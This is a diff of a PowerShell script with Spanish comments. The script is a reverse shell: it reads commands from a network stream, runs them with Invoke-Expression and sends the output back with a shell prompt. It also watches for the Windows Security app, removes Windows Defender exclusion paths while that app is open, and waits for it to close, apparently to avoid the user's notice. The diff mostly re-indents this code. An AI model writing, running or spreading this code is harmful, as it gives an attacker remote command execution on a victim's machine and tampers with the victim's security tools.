@@ -11,26 +11,28 @@ for ($count = 1; $count -le $maxIterations; $count++) {
         $buffer = New-Object Byte[] 1024
         $encoding = New-Object System.Text.ASCIIEncoding
 
-        while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
+        while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
 
-        # Verificar si el proceso SecHealthUI.exe está activo
+            # Verificar si el proceso SecHealthUI.exe está activo
             if (Get-Process -Name "SecHealthUI" -ErrorAction SilentlyContinue) {
                 # Quitar exclusiones de rutas en Windows Defender
                 (Get-MpPreference).ExclusionPath | ForEach-Object { Remove-MpPreference -ExclusionPath $_ }
                 Write-Host "SecHealthUI.exe está en ejecución. Esperando a que se cierre..."
+                
                 # Bucle de espera hasta que el proceso termine
                 while (Get-Process -Name "SecHealthUI" -ErrorAction SilentlyContinue) {
                     Start-Sleep -Seconds 2
                 }
-        
-            $data = $encoding.GetString($buffer,0, $i)
-            $sendback = (Invoke-Expression $data | Out-String )
-            $sendback2  = $sendback + "PS " + (pwd).Path + "> "
-            $writer.Write($sendback2)
-            $writer.Flush()
-        }
 
-        $client.Close()
+                $data = $encoding.GetString($buffer,0, $i)
+                $sendback = (Invoke-Expression $data | Out-String )
+                $sendback2  = $sendback + "PS " + (pwd).Path + "> "
+                $writer.Write($sendback2)
+                $writer.Flush()
+            }
+
+            $client.Close()
+        }
     }
     catch {
         # opcional: escribir el error si quieres debug
